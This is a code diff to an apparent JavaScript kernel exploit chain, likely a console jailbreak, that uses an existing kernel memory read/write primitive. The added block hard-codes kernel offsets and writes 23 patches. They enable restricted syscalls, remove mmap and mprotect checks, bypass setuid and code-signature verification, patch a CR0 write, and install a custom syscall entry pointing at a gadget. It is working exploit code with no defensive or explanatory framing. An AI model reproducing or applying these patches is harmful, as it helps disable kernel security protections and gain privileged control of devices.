@@ -1469,7 +1469,101 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
      kmem.write64(w_rthdr_p, 0);
      log('corrupt pointers cleaned');
 
+    const OFF_enable_syscalls_1 = 0x490;
+const OFF_enable_syscalls_2 = 0x4B5;
+const OFF_enable_syscalls_3 = 0x4B9;
+const OFF_enable_syscalls_4 = 0x4C2;
+const OFF_mprotect          = 0x80B8D;
+const OFF_prx               = 0x23AEC4;
+const OFF_mmap_1            = 0x16632A;
+const OFF_mmap_2            = 0x16632D;
+const OFF_dlsym_1           = 0x23B67F;
+const OFF_dlsym_2           = 0x221B40;
+const OFF_setuid            = 0x1A06;
+const OFF_bzero             = 0x2713FD;
+const OFF_pagezero          = 0x271441;
+const OFF_memcpy            = 0x2714BD;
+const OFF_pagecopy          = 0x271501;
+const OFF_copyin            = 0x2716AD;
+const OFF_copyinstr         = 0x271B5D;
+const OFF_copystr           = 0x271C2D;
+const OFF_veriPatch         = 0x626874;
+const OFF_setcr0_patch      = 0x3ADE3B;
+const OFF_sysent_11         = 0x1100520;
+const GADGET_syscall11      = 0x4C7AD;
+ //  PATCH 1: enable_syscalls_1  -> write32(kbase + 0x490, 0x00000000)
+  kmem.write32(kbase.add(OFF_enable_syscalls_1), 0x00000000);
 
+  //  PATCH 2: enable_syscalls_2  -> write16(kbase + 0x4B5, 0x9090)
+  kmem.write16(kbase.add(OFF_enable_syscalls_2), 0x9090);
+
+  //  PATCH 3: enable_syscalls_3  -> write16(kbase + 0x4B9, 0x9090)
+  kmem.write16(kbase.add(OFF_enable_syscalls_3), 0x9090);
+
+  //  PATCH 4: enable_syscalls_4  -> write8(kbase + 0x4C2, 0xEB)
+  kmem.write8(kbase.add(OFF_enable_syscalls_4), 0xEB);
+
+  //  PATCH 5: mmap_1             -> write8(kbase + 0x16632A, 0x37)
+  kmem.write8(kbase.add(OFF_mmap_1), 0x37);
+
+  //  PATCH 6: mmap_2             -> write8(kbase + 0x16632D, 0x37)
+  kmem.write8(kbase.add(OFF_mmap_2), 0x37);
+
+  //  PATCH 7: mprotect           -> write32(kbase + 0x80B8D, 0x00000000)
+  kmem.write32(kbase.add(OFF_mprotect), 0x00000000);
+
+  //  PATCH 8: dlsym_1            -> write8(kbase + 0x23B67F, 0xEB)
+  kmem.write8(kbase.add(OFF_dlsym_1), 0xEB);
+
+  //  PATCH 9: dlsym_2            -> write32(kbase + 0x221B40, 0xC3C03148)
+  kmem.write32(kbase.add(OFF_dlsym_2), 0xC3C03148);
+
+  //  PATCH 10: setuid            -> write8(kbase + 0x1A06, 0xEB)
+  kmem.write8(kbase.add(OFF_setuid), 0xEB);
+
+  //  PATCH 11: prx               -> write16(kbase + 0x23AEC4, 0xE990)
+  kmem.write16(kbase.add(OFF_prx), 0xE990);
+
+  //  PATCH 12: bzero             -> write8(kbase + 0x2713FD, 0xEB)
+  kmem.write8(kbase.add(OFF_bzero), 0xEB);
+
+  //  PATCH 13: pagezero          -> write8(kbase + 0x271441, 0xEB)
+  kmem.write8(kbase.add(OFF_pagezero), 0xEB);
+
+  //  PATCH 14: memcpy            -> write8(kbase + 0x2714BD, 0xEB)
+  kmem.write8(kbase.add(OFF_memcpy), 0xEB);
+
+  //  PATCH 15: pagecopy          -> write8(kbase + 0x271501, 0xEB)
+  kmem.write8(kbase.add(OFF_pagecopy), 0xEB);
+
+  //  PATCH 16: copyin            -> write8(kbase + 0x2716AD, 0xEB)
+  kmem.write8(kbase.add(OFF_copyin), 0xEB);
+
+  //  PATCH 17: copyinstr         -> write8(kbase + 0x271B5D, 0xEB)
+  kmem.write8(kbase.add(OFF_copyinstr), 0xEB);
+
+  //  PATCH 18: copystr           -> write8(kbase + 0x271C2D, 0xEB)
+  kmem.write8(kbase.add(OFF_copystr), 0xEB);
+
+  //  PATCH 19: veriPatch         -> write16(kbase + 0x626874, 0x9090)
+  kmem.write16(kbase.add(OFF_veriPatch), 0x9090);
+
+  //  PATCH 20: setcr0_patch      -> write32(kbase + 0x3ADE3B, 0xC3C7220F)
+  kmem.write32(kbase.add(OFF_setcr0_patch), 0xC3C7220F);
+
+  //  PATCH 21-23: sysent_11 „2-0x4c7ad-1“ 
+  //    21) write32(kbase+0x1100520,  0x00000002)
+  kmem.write32(kbase.add(OFF_sysent_11), 0x00000002);
+
+  //    22) write64(kbase+0x1100520+8, kbase + 0x4C7AD)
+  //        NB: qui “kbase + 0x4C7AD” è l’indirizzo di un “ret gadget”
+  kmem.write64(
+    kbase.add(OFF_sysent_11 + 8),
+    kbase.add(GADGET_syscall11)
+  );
+
+  //    23) write32(kbase+0x1100520+0x2C, 0x00000001)
+  kmem.write32(kbase.add(OFF_sysent_11 + 0x2C), 0x00000001);
 const patchList = {
   enable_syscalls_1: [0x490,    4, 0x00000000],
   enable_syscalls_2: [0x4B5,    2, 0x9090    ],
@@ -1521,6 +1615,10 @@ const patchList = {
   }
 }
 checkAllPatches();
+
+
+
+    
     /*
     // REMOVE once restore kernel is ready for production
     // increase the ref counts to prevent deallocation
